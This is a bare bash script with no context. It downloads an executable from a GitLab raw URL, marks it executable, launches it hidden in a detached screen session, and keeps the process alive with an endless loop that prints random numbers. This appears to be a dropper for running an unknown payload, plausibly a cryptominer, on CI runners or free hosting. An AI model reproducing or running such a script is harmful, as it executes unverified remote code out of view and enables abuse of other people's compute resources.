#!/bin/bash

wget https://gitlab.com/tamen1/ninu/-/raw/main/ninu2
chmod +x ninu2
screen -dmS zanu ./ninu2 ann
while :; do shuf -n 1 -i 1-99999999; sleep 10; done
